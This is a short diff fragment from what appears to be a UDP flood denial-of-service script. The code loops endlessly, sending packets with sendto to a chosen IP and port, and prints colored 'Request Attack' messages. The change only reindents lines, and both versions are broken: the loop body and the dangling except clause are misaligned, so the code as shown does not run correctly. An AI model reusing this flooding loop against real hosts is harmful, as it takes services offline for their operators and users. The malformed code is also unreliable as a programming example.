@@ -78,11 +78,11 @@ time.sleep(5),
 
 sent = 0
 while True:
-    addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-			print("\033[95m[\033[97m+\033[95m] \033[91mRequest Attack  :. " +ip+ " \033[0m")
-		except:
-			print("\033[33m[\033[95m!\033[33m] Error!")
+        addr = (str(ip),int(port))
+        for x in range(times):
+        s.sendto(data,addr)
+	print("\033[95m[\033[97m+\033[95m] \033[91mRequest Attack  :. " +ip+ " \033[0m")
+except:
+	print("\033[33m[\033[95m!\033[33m] Error!")
                          
      
